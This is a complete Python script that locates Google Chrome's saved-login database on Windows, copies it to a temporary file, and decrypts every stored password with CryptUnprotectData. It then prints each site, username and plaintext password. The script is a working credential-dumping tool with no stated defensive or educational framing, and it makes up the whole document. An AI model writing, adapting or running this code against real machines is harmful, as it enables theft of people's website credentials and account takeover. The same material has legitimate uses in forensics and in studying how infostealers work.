import os
import sys
import sqlite3
import win32crypt
import traceback

from shutil import copyfile

def dump(filename):
	try:
		filename = os.path.abspath(filename)
		conn     = sqlite3.connect(filename)
		cursor   = conn.cursor()

		cursor.execute('SELECT action_url, username_value, password_value FROM logins')
		for result in cursor.fetchall():
			password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
			if password:
				print ('''
Site:     %s
Username: %s
Password: %s
''' % (result[0], result[1], password))

	except Exception as e:
		traceback.print_exc()
		pass

if len(sys.argv) > 1:
	for file in sys.argv[1:]:
		dump(file)
else:
	path = os.getenv("APPDATA") + "\\..\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
	dest = os.getenv("TEMP") + "\\login"

	# Prevent file locks
	copyfile(path, dest)
	dump(dest)
	os.remove(dest)


